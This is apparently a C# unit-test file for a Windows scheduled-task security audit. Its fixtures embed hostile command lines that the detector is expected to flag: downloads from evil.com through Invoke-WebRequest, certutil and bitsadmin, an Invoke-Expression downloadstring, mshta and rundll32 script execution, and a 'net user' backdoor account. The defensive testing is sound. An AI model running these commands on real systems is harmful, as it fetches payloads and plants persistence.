using WinSentinel.Core.Audits;
using WinSentinel.Core.Models;
using static WinSentinel.Core.Audits.ScheduledTaskAudit;

namespace WinSentinel.Tests.Audits;

public class ScheduledTaskAuditTests
{
    private readonly ScheduledTaskAudit _audit;

    public ScheduledTaskAuditTests()
    {
        _audit = new ScheduledTaskAudit();
    }

    private static AuditResult MakeResult() => new()
    {
        ModuleName = "Scheduled Task Security Audit",
        Category = "ScheduledTasks"
    };

    private static ScheduledTaskState MakeCleanState() => new()
    {
        TotalTaskCount = 2,
        Tasks = new List<TaskEntry>
        {
            new()
            {
                TaskName = "UpdateChecker",
                TaskPath = @"\MyApp\",
                State = "Ready",
                Principal = "INTERACTIVE",
                RunLevel = "LeastPrivilege",
                Actions = new List<TaskAction>
                {
                    new() { Execute = @"C:\Program Files\MyApp\update.exe", Arguments = "--check" }
                },
                Triggers = new List<string> { "Daily" }
            },
            new()
            {
                TaskName = "Cleanup",
                TaskPath = @"\MyApp\",
                State = "Ready",
                Principal = "INTERACTIVE",
                RunLevel = "LeastPrivilege",
                Actions = new List<TaskAction>
                {
                    new() { Execute = @"C:\Program Files\MyApp\cleanup.exe" }
                },
                Triggers = new List<string> { "Weekly" }
            }
        }
    };

    private static ScheduledTaskState MakeSuspiciousState() => new()
    {
        TotalTaskCount = 5,
        Tasks = new List<TaskEntry>
        {
            new()
            {
                TaskName = "WindowsUpdate",
                TaskPath = @"\Microsoft\Windows\UpdateOrchestrator\",
                State = "Ready",
                Principal = "NT AUTHORITY\\SYSTEM",
                RunLevel = "HighestAvailable",
                Actions = new List<TaskAction>
                {
                    new() { Execute = @"C:\Windows\System32\usoclient.exe", Arguments = "StartScan" }
                },
                Triggers = new List<string> { "Daily" }
            },
            new()
            {
                TaskName = "SuspiciousTask",
                TaskPath = @"\",
                State = "Ready",
                Principal = "NT AUTHORITY\\SYSTEM",
                RunLevel = "HighestAvailable",
                Actions = new List<TaskAction>
                {
                    new() { Execute = @"C:\Users\Public\temp\malware.exe" }
                },
                Triggers = new List<string> { "Logon" },
                Hidden = true
            },
            new()
            {
                TaskName = "EncodedRunner",
                TaskPath = @"\",
                State = "Ready",
                Principal = "INTERACTIVE",
                RunLevel = "LeastPrivilege",
                Actions = new List<TaskAction>
                {
                    new() { Execute = "powershell.exe", Arguments = "-EncodedCommand SGVsbG8gV29ybGQ=" }
                },
                Triggers = new List<string> { "Daily" }
            },
            new()
            {
                TaskName = "Downloader",
                TaskPath = @"\",
                State = "Ready",
                Principal = "NT AUTHORITY\\SYSTEM",
                RunLevel = "HighestAvailable",
                Actions = new List<TaskAction>
                {
                    new() { Execute = "powershell.exe", Arguments = "-Command Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\temp\\a.exe" }
                },
                Triggers = new List<string> { "Boot" }
            },
            new()
            {
                TaskName = "OrphanedTask",
                TaskPath = @"\",
                State = "Ready",
                Principal = "INTERACTIVE",
                RunLevel = "LeastPrivilege",
                Actions = new List<TaskAction>
                {
                    new() { Execute = @"C:\Program Files\DeletedApp\run.exe" }
                },
                Triggers = new List<string> { "Daily" },
                ExecutableExists = false
            }
        }
    };

    // ─── Module metadata ──────────────────────────────────────────

    [Fact]
    public void Name_ReturnsExpected()
    {
        Assert.Equal("Scheduled Task Security Audit", _audit.Name);
    }

    [Fact]
    public void Category_ReturnsExpected()
    {
        Assert.Equal("ScheduledTasks", _audit.Category);
    }

    [Fact]
    public void Description_IsNotEmpty()
    {
        Assert.False(string.IsNullOrWhiteSpace(_audit.Description));
    }

    // ─── Clean state ──────────────────────────────────────────────

    [Fact]
    public void AnalyzeState_CleanConfig_NoWarningsOrCritical()
    {
        var state = MakeCleanState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.Equal(0, result.CriticalCount);
        Assert.Equal(0, result.WarningCount);
    }

    [Fact]
    public void AnalyzeState_CleanConfig_HasPassFindings()
    {
        var state = MakeCleanState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.True(result.PassCount > 0);
    }

    // ─── Task count ───────────────────────────────────────────────

    [Fact]
    public void AnalyzeState_FewTasks_PassFinding()
    {
        var state = MakeCleanState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Third-Party Task Count") && f.Severity == Severity.Pass);
    }

    [Fact]
    public void AnalyzeState_ManyTasks_WarningFinding()
    {
        var state = new ScheduledTaskState { Tasks = new List<TaskEntry>() };
        for (int i = 0; i < 55; i++)
        {
            state.Tasks.Add(new TaskEntry
            {
                TaskName = $"Task{i}",
                TaskPath = @"\Custom\",
                Principal = "INTERACTIVE",
                RunLevel = "LeastPrivilege",
                Actions = new List<TaskAction>
                {
                    new() { Execute = $@"C:\Program Files\App{i}\run.exe" }
                }
            });
        }
        state.TotalTaskCount = 55;

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("High Number of Third-Party Tasks") && f.Severity == Severity.Warning);
    }

    // ─── Suspicious executable path ───────────────────────────────

    [Fact]
    public void AnalyzeState_TempDirExecutable_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "BadTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Users\someone\AppData\Local\Temp\evil.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Path") && f.Severity == Severity.Critical);
    }

    [Fact]
    public void AnalyzeState_PublicDirExecutable_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "PublicTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Users\Public\malware.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Path") && f.Severity == Severity.Critical);
    }

    [Fact]
    public void AnalyzeState_DownloadsDirExecutable_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "DlTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Users\user\Downloads\setup.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Path") && f.Severity == Severity.Critical);
    }

    // ─── Microsoft tasks are skipped ──────────────────────────────

    [Fact]
    public void AnalyzeState_MicrosoftTask_Skipped()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "Schedule Scan",
                    TaskPath = @"\Microsoft\Windows\UpdateOrchestrator\",
                    Principal = "NT AUTHORITY\\SYSTEM",
                    RunLevel = "HighestAvailable",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Windows\System32\usoclient.exe" }
                    },
                    Triggers = new List<string> { "Boot" }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        // Should not flag Microsoft tasks
        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains("Schedule Scan"));
    }

    // ─── High privilege tasks ─────────────────────────────────────

    [Fact]
    public void AnalyzeState_SystemTaskWithSuspiciousCommand_Critical()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "BadSystemTask",
                    TaskPath = @"\",
                    Principal = "NT AUTHORITY\\SYSTEM",
                    RunLevel = "HighestAvailable",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "powershell.exe", Arguments = "-Command Invoke-Expression (downloadstring ...)" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("High-Privilege Task with Suspicious Command") && f.Severity == Severity.Critical);
    }

    [Fact]
    public void AnalyzeState_SystemTaskWithSafeCommand_InfoOnly()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "LegitSystemTask",
                    TaskPath = @"\",
                    Principal = "NT AUTHORITY\\SYSTEM",
                    RunLevel = "HighestAvailable",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Program Files\LegitApp\service.exe", Arguments = "--run" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Elevated Task") && f.Severity == Severity.Info);
        Assert.DoesNotContain(result.Findings, f =>
            f.Severity == Severity.Critical && f.Title.Contains("LegitSystemTask"));
    }

    // ─── Encoded commands ─────────────────────────────────────────

    [Fact]
    public void AnalyzeState_EncodedPowerShell_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "EncodedTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "powershell.exe", Arguments = "-EncodedCommand SGVsbG8=" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Encoded Command") && f.Severity == Severity.Critical);
    }

    [Fact]
    public void AnalyzeState_Base64String_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "B64Task",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "powershell.exe", Arguments = "[Convert]::FromBase64String('dGVzdA==')" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Severity == Severity.Critical && f.Title.Contains("Encoded Command"));
    }

    // ─── Suspicious command patterns ──────────────────────────────

    [Fact]
    public void AnalyzeState_InvokeWebRequest_WarningFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "DownloaderTask",
                    TaskPath = @"\",
                    Principal = "INTERACTIVE",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "powershell.exe", Arguments = "Invoke-WebRequest http://example.com/file.zip" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Command") && f.Severity == Severity.Warning);
    }

    [Fact]
    public void AnalyzeState_CertutilUrlCache_WarningFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "CertUtilTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "cmd.exe", Arguments = "/c certutil -urlcache -split -f http://evil.com/payload.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Command"));
    }

    [Fact]
    public void AnalyzeState_Rundll32_WarningFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "Rundll32Task",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Suspicious Command"));
    }

    [Theory]
    [InlineData("net user admin Password123 /add")]
    [InlineData("reg add HKLM\\Software\\Evil /v Key /d Value")]
    [InlineData("bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\a.exe")]
    [InlineData("mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run ...\")")]
    public void AnalyzeState_SuspiciousPatterns_FlagsWarningOrCritical(string command)
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "PatternTest",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "cmd.exe", Arguments = $"/c {command}" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Severity >= Severity.Warning && f.Title.Contains("PatternTest"));
    }

    // ─── Hidden tasks ─────────────────────────────────────────────

    [Fact]
    public void AnalyzeState_HiddenTask_WarningFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "StealthTask",
                    TaskPath = @"\",
                    Hidden = true,
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Program Files\App\run.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Hidden") && f.Severity == Severity.Warning);
    }

    [Fact]
    public void AnalyzeState_NotHiddenTask_NoHiddenFinding()
    {
        var state = MakeCleanState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains("Hidden"));
    }

    // ─── Persistence triggers ─────────────────────────────────────

    [Fact]
    public void AnalyzeState_LogonTriggerWithSuspiciousAction_CriticalFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "PersistTask",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = "powershell.exe", Arguments = "-Command Invoke-Expression (downloadstring http://evil.com)" }
                    },
                    Triggers = new List<string> { "Logon" }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Persistence") && f.Severity == Severity.Critical);
    }

    [Fact]
    public void AnalyzeState_BootTriggerWithSafeAction_InfoFinding()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "BootService",
                    TaskPath = @"\",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Program Files\App\service.exe" }
                    },
                    Triggers = new List<string> { "Boot" }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Persistence Trigger") && f.Severity == Severity.Info);
    }

    [Fact]
    public void AnalyzeState_DailyTrigger_NoPersistenceFinding()
    {
        var state = MakeCleanState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains("Persistence"));
    }

    // ─── Elevated third-party task summary ────────────────────────

    [Fact]
    public void AnalyzeState_ManyElevatedTasks_WarningFinding()
    {
        var state = new ScheduledTaskState { Tasks = new List<TaskEntry>() };
        for (int i = 0; i < 12; i++)
        {
            state.Tasks.Add(new TaskEntry
            {
                TaskName = $"ElevTask{i}",
                TaskPath = @"\Custom\",
                Principal = "NT AUTHORITY\\SYSTEM",
                RunLevel = "HighestAvailable",
                Actions = new List<TaskAction>
                {
                    new() { Execute = $@"C:\Program Files\App{i}\run.exe" }
                }
            });
        }
        state.TotalTaskCount = 12;

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Many Elevated Third-Party Tasks") && f.Severity == Severity.Warning);
    }

    [Fact]
    public void AnalyzeState_FewElevatedTasks_NoSummaryWarning()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "ElevTask1",
                    TaskPath = @"\",
                    Principal = "NT AUTHORITY\\SYSTEM",
                    RunLevel = "HighestAvailable",
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Program Files\App\run.exe" }
                    }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains("Many Elevated"));
    }

    // ─── Hidden task summary ──────────────────────────────────────

    [Fact]
    public void AnalyzeState_MultipleHiddenTasks_SummaryWarning()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new() { TaskName = "H1", TaskPath = @"\", Hidden = true, Actions = new() { new() { Execute = "a.exe" } } },
                new() { TaskName = "H2", TaskPath = @"\", Hidden = true, Actions = new() { new() { Execute = "b.exe" } } },
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.Contains(result.Findings, f =>
            f.Title.Contains("Hidden Third-Party Tasks Found") && f.Severity == Severity.Warning);
    }

    // ─── Combined suspicious state ────────────────────────────────

    [Fact]
    public void AnalyzeState_SuspiciousState_MultipleCriticals()
    {
        var state = MakeSuspiciousState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.True(result.CriticalCount >= 2, $"Expected ≥2 critical findings, got {result.CriticalCount}");
    }

    [Fact]
    public void AnalyzeState_SuspiciousState_MicrosoftTaskSkipped()
    {
        var state = MakeSuspiciousState();
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains("WindowsUpdate") && f.Severity >= Severity.Warning);
    }

    // ─── Edge cases ───────────────────────────────────────────────

    [Fact]
    public void AnalyzeState_EmptyState_OnlyPassFinding()
    {
        var state = new ScheduledTaskState { Tasks = new List<TaskEntry>() };
        var result = MakeResult();

        _audit.AnalyzeState(state, result);

        Assert.True(result.PassCount > 0);
        Assert.Equal(0, result.CriticalCount);
        Assert.Equal(0, result.WarningCount);
    }

    [Fact]
    public void AnalyzeState_TaskWithNoActions_NoException()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new() { TaskName = "EmptyActions", TaskPath = @"\" }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        // Should not throw
        Assert.NotNull(result);
    }

    [Fact]
    public void AnalyzeState_TaskWithEmptyExecute_NoException()
    {
        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = "BlankExe",
                    TaskPath = @"\",
                    Actions = new List<TaskAction> { new() { Execute = "" } }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        Assert.NotNull(result);
    }

    // ─── Safe task prefix detection ───────────────────────────────

    [Theory]
    [InlineData(@"\Microsoft\Windows\Defrag\ScheduledDefrag")]
    [InlineData(@"\Apple\AppleSoftwareUpdate")]
    [InlineData(@"\Google\GoogleUpdater")]
    [InlineData(@"\Adobe\AcrobatUpdate")]
    public void AnalyzeState_KnownSafeTaskPrefixes_Skipped(string fullPath)
    {
        var parts = fullPath.Split('\\');
        var taskName = parts[^1];
        var taskPath = string.Join('\\', parts[..^1]) + @"\";

        var state = new ScheduledTaskState
        {
            Tasks = new List<TaskEntry>
            {
                new()
                {
                    TaskName = taskName,
                    TaskPath = taskPath,
                    Principal = "NT AUTHORITY\\SYSTEM",
                    RunLevel = "HighestAvailable",
                    Hidden = true,
                    Actions = new List<TaskAction>
                    {
                        new() { Execute = @"C:\Users\Public\temp\suspicious.exe" }
                    },
                    Triggers = new List<string> { "Logon" }
                }
            }
        };

        var result = MakeResult();
        _audit.AnalyzeState(state, result);

        // Known-safe tasks should be skipped — no critical/warning findings about the task itself
        Assert.DoesNotContain(result.Findings, f =>
            f.Title.Contains(taskName) && f.Severity >= Severity.Warning);
    }

    // ─── Static data validation ───────────────────────────────────

    [Fact]
    public void SuspiciousPaths_NotEmpty()
    {
        Assert.NotEmpty(ScheduledTaskAudit.SuspiciousPaths);
    }

    [Fact]
    public void SafeTaskPrefixes_NotEmpty()
    {
        Assert.NotEmpty(ScheduledTaskAudit.SafeTaskPrefixes);
    }

    [Fact]
    public void SuspiciousCommandPatterns_NotEmpty()
    {
        Assert.NotEmpty(ScheduledTaskAudit.SuspiciousCommandPatterns);
    }

    [Fact]
    public void HighPrivilegePrincipals_ContainsSystem()
    {
        Assert.Contains("NT AUTHORITY\\SYSTEM", ScheduledTaskAudit.HighPrivilegePrincipals);
    }

    [Fact]
    public void HighPrivilegePrincipals_CaseInsensitive()
    {
        Assert.Contains("system", ScheduledTaskAudit.HighPrivilegePrincipals);
    }
}
